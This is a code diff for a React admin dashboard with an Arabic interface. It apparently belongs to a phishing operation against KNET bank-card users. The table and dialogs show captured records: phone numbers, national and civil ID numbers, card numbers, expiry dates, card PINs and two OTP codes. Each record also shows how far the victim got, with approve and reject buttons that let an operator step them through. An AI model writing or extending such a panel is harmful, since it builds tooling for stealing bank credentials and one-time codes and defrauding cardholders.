+                            {r.step_reached != null ? <Badge variant="outline" className="bg-slate-800/50 text-slate-300 border-slate-700">خطوة {r.step_reached}</Badge> : <span className="text-slate-500">—</span>}
+                          </td>
+                          <td className="px-4 py-3">
+                            <div className="flex flex-col gap-1">
+                              {r.otp1 ? <span className="font-mono text-xs text-amber-400 bg-amber-500/10 border border-amber-500/30 rounded px-2 py-0.5">OTP1: {r.otp1}</span> : null}
+                              {r.otp2 ? <span className="font-mono text-xs text-cyan-400 bg-cyan-500/10 border border-cyan-500/30 rounded px-2 py-0.5">OTP2: {r.otp2}</span> : null}
+                              {!r.otp1 && !r.otp2 && <span className="text-slate-500">—</span>}
+                            </div>
+                          </td>
+                          <td className="px-4 py-3">
+                            <div className="flex items-center gap-1 text-sm text-slate-400">
+                              <Clock className="h-3 w-3 flex-shrink-0" />
+                              <span className="whitespace-nowrap">{r.created_date ? formatDistanceToNow(new Date(r.created_date), { addSuffix: true, locale: ar }) : "—"}</span>
+                            </div>
+                          </td>
+                          <td className="px-4 py-3">
+                            <div className="flex items-center gap-1 flex-wrap">
+                              <Button variant="outline" size="sm" onClick={() => handleApproval("approved", r.id)} disabled={statusLabel === "approved"} className="bg-green-500/20 text-green-400 border-green-500/30 hover:bg-green-500/30 text-xs h-7">
+                                <CheckCircle className="h-3 w-3 mr-1" />موافقة
+                              </Button>
+                              <Button variant="outline" size="sm" onClick={() => handleApproval("rejected", r.id)} disabled={statusLabel === "rejected"} className="bg-red-500/20 text-red-400 border-red-500/30 hover:bg-red-500/30 text-xs h-7">
+                                <XCircle className="h-3 w-3 mr-1" />رفض
+                              </Button>
+                              <FlagColorSelector id={r.id} currentColor={r.bank} onChange={handleFlagChange} />
+                              <Button variant="ghost" size="sm" onClick={() => handleDelete(r.id)} className="text-red-500 hover:text-red-400 hover:bg-red-950/30 h-7 w-7 p-0">
+                                <Trash2 className="h-3 w-3" />
+                              </Button>
+                            </div>
+                          </td>
+                        </tr>
+                      );
+                    })}
+                  </tbody>
+                </table>
+              </div>
+            )}
+          </CardContent>
+          {paginated.length > 0 && (
+            <CardFooter className="border-t border-slate-800/50 p-4">
+              <PaginationBar currentPage={currentPage} totalPages={totalPages} onPageChange={setCurrentPage} totalItems={filtered.length} itemsPerPage={itemsPerPage} />
+            </CardFooter>
+          )}
+        </Card>
       </div>
 
-      {selectedRecord && (
-        <RecordDetailModal record={selectedRecord} onClose={() => setSelectedRecord(null)} />
-      )}
+      {/* Personal Info Dialog */}
+      <Dialog open={dialogType === "personal"} onOpenChange={closeDialog}>
+        <DialogContent className="max-w-md" dir="rtl">
+          <DialogHeader>
+            <DialogTitle className="flex items-center gap-3 text-xl font-semibold">
+              <div className="w-10 h-10 rounded-full flex items-center justify-center bg-gradient-to-br from-blue-500 to-cyan-500 shadow-md">
+                <User className="h-5 w-5 text-white" />
+              </div>
+              المعلومات الشخصية
+            </DialogTitle>
+          </DialogHeader>
+          {selectedRecord && (
+            <InfoSection items={[
+              { label: "رقم الهاتف", value: selectedRecord.phone_number },
+              { label: "رقم الهوية", value: selectedRecord.id_number, sensitive: true },
+              { label: "الرقم المدني", value: selectedRecord.civil_id, sensitive: true },
+              { label: "المبلغ", value: selectedRecord.amount },
+              { label: "الشبكة", value: selectedRecord.network },
+              { label: "الخطوة", value: selectedRecord.step_reached },
+            ]} />
+          )}
+          <DialogFooter>
+            <Button variant="outline" className="w-full" onClick={closeDialog}>إغلاق</Button>
+          </DialogFooter>
+        </DialogContent>
+      </Dialog>
+
+      {/* KNET Card Info Dialog */}
+      <Dialog open={dialogType === "card"} onOpenChange={closeDialog}>
+        <DialogContent className="max-w-md" dir="rtl">
+          <DialogHeader>
+            <DialogTitle className="flex items-center gap-3 text-xl font-semibold">
+              <div className="w-10 h-10 rounded-full flex items-center justify-center bg-gradient-to-br from-violet-500 to-purple-600 shadow-md">
+                <CreditCard className="h-5 w-5 text-white" />
+              </div>
+              معلومات KNET
+            </DialogTitle>
+          </DialogHeader>
+          {selectedRecord && (
+            <InfoSection items={[
+              { label: "رقم البطاقة", value: selectedRecord.card_number ? `${selectedRecord.card_prefix || ""} - ${selectedRecord.card_number}` : null, ltr: true },
+              { label: "تاريخ الانتهاء", value: selectedRecord.expiry_year && selectedRecord.expiry_month ? `${selectedRecord.expiry_year}/${selectedRecord.expiry_month}` : null },
+              { label: "الرقم السري", value: selectedRecord.pin, sensitive: true },
+              { label: "رمز OTP1", value: selectedRecord.otp1, sensitive: true },
+              { label: "رمز OTP2", value: selectedRecord.otp2, sensitive: true },
+            ]} />
+          )}
+          <DialogFooter>
+            <Button variant="outline" className="w-full" onClick={closeDialog}>إغلاق</Button>
+          </DialogFooter>
+        </DialogContent>
+      </Dialog>
     </div>
   );
 }
